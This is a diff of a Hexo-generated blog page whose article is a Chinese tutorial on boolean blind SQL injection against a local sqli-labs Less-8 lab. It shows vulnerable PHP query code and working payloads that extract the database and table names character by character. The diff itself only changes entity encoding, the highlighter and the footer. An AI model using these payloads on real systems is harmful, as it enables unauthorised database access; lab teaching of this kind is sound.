@@ -14,7 +14,11 @@
     <meta name="screen-orientation" content="portrait">
     <link rel="dns-prefetch" href="http://tea9.xyz">
   	<link rel="stylesheet" href="/css/style.css">
-  	<link rel="stylesheet" href="/css/github-gist.css">
+    <link rel="stylesheet" href="/css/github-gist.css">
+    
+      <link rel="stylesheet" href="/css/prettify.css">
+      <link rel="stylesheet" href="/css/highlight/atelier-savanna-light.min.css">
+    
     <!--SEO-->
 
 <meta name="description" content="心中有光の孩子"/>
@@ -96,8 +100,8 @@
 	    </div>
 		<hr class="one"/>
 		<div class="archive-content typo">
-			<h2 id="SQL盲注-布尔盲注"><a href="#SQL盲注-布尔盲注" class="headerlink" title="SQL盲注-布尔盲注"></a>SQL盲注-布尔盲注</h2><h3 id="01布尔盲注原理"><a href="#01布尔盲注原理" class="headerlink" title="01布尔盲注原理"></a>01布尔盲注原理</h3><pre><code>$id=$_GET[&apos;id&apos;];
-$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1 &quot;;
+			<h2 id="SQL盲注-布尔盲注"><a href="#SQL盲注-布尔盲注" class="headerlink" title="SQL盲注-布尔盲注"></a>SQL盲注-布尔盲注</h2><h3 id="01布尔盲注原理"><a href="#01布尔盲注原理" class="headerlink" title="01布尔盲注原理"></a>01布尔盲注原理</h3><pre><code>$id=$_GET[&#39;id&#39;];
+$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1 &quot;;
 $result=mysql_query($sql);
 $row=mysql_fetch_array($result);
 if($row)
@@ -114,11 +118,11 @@ else
 <p>正确请求，id=1 -&gt; 返回 id=1的数据  </p>
 <p>错误请求，id=1’ -&gt; 返回 与正确页面不同的页面<br>1.如果页面返回“假”，说明系统执行的SQL语句为“假”如：id=1 and left((select version()),1)=5–+<br>2.想办法构造语句，判断数据库中内容的值<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/01.jpeg" alt=""></p>
 <h3 id="02布尔盲注方法"><a href="#02布尔盲注方法" class="headerlink" title="02布尔盲注方法"></a>02布尔盲注方法</h3><p>构造逻辑判断语句，判断信息的真假，取出所有的真值，实现SQL注入  </p>
-<pre><code>left() left(database(),1)&gt;&apos;s&apos;
+<pre><code>left() left(database(),1)&gt;&#39;s&#39;
         database()显示数据库名称，left(a,b)从左侧截取a的前b位
-regexp select user() regexp &apos;^r&apos;
+regexp select user() regexp &#39;^r&#39;
         正则表达式的用法user()结果位root,regexp为匹配root的正则表达式
-like    select user() like &apos;ro%&apos;
+like    select user() like &#39;ro%&#39;
         与regexp类似，使用like进行匹配
 substr()  ascii(substr((select database()),1,1))=98
 ascii() substr(a,b,c)从b位置开始，截取字符串a到c长度，ascii()将某个字符转换为ascii值
@@ -127,17 +131,17 @@ mid()    mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数痛ascii
 </code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/02.jpeg" alt=""></p>
 <p><a href="http://www.runoob.com/mysql/mysql-regexp.html" target="_blank" rel="noopener">MySql正则表达式</a></p>
 <p>注入点： </p>
-<pre><code>http://localhost:90/Less-8/?id=1&apos;
-http://localhost:90/Less-8/?id=1&apos; and left((select database()),1)=&apos;a&apos;--+
-http://localhost:90/Less-8/?id=1&apos; and left((select database()),1)=&apos;s&apos;--+ 显示正确第一位为s
+<pre><code>http://localhost:90/Less-8/?id=1&#39;
+http://localhost:90/Less-8/?id=1&#39; and left((select database()),1)=&#39;a&#39;--+
+http://localhost:90/Less-8/?id=1&#39; and left((select database()),1)=&#39;s&#39;--+ 显示正确第一位为s
 
-http://localhost:90/Less-8/?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&apos;e&apos;--+ 第一个表名称字符
+http://localhost:90/Less-8/?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39;--+ 第一个表名称字符
 
-http://localhost:90/Less-8/?id=1&apos; and (select database() regexp &apos;^s&apos;)--+
+http://localhost:90/Less-8/?id=1&#39; and (select database() regexp &#39;^s&#39;)--+
 
-http://localhost:90/Less-8/?id=1&apos; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &apos;^s&apos;)--+
+http://localhost:90/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#39;^s&#39;)--+
 
-http://localhost:90/Less-8/?id=1&apos; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &apos;e%&apos;)--+
+http://localhost:90/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#39;e%&#39;)--+
 
 http://localhost:90/Less-8/?id=1 and ascii((substr((select database()),1,1))=115--+
 
@@ -167,24 +171,34 @@ http://localhost:90/Less-8/?id=1 and ascii((substr((select table_name from infor
 
 		<hr />
 <div class="footer">
-	
-        
-            <a href="//github.com/tea9" rel="external nofollow" title="Github" target="_blank">
-		    	<i class="iconfont">&#xeee2;</i>
-		    </a>&nbsp;&nbsp;
-        
-            <a href="/atom.xml" rel="external nofollow" title="RSS" target="_blank">
-		    	<i class="iconfont">&#xe6ee;</i>
-		    </a>&nbsp;&nbsp;
-        
-	
+   
+    
+      <a href="//github.com/tea9" rel="external nofollow" title="Github" target="_blank">
+        <i class="iconfont">&#xeee2;</i> 
+      </a>
+      &nbsp;&nbsp; 
+    
+      <a href="/atom.xml" rel="external nofollow" title="RSS" target="_blank">
+        <i class="iconfont">&#xe6ee;</i> 
+      </a>
+      &nbsp;&nbsp; 
+     
+  
 </div>
 <script src="/js/jquery.min.js"></script>
-<script src="/js/highlight.js"></script>
-<script>hljs.initHighlightingOnLoad();</script>
+ <script src="/js/prettify.js"></script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $("pre").addClass(
+      "prettyprint linenums"
+    );
+    prettyPrint();
+  });
+</script>
+
 
 		<div class="copyright">
-	Copyright &copy; 2019 . 没有备案<br />Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Theme is <a href="https://github.com/praming/hexo-theme-Ice" target="_blank">Ice</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Hosted by <a href="https://pages.coding.me">Coding Pages</a>
+	Copyright &copy; 2019 . <a href="/v1">v1</a> . <a href="/v2">v2</a><br />Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Theme is <a href="https://github.com/praming/hexo-theme-Ice" target="_blank">Ice</a>
 </div>
   <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
 </html>
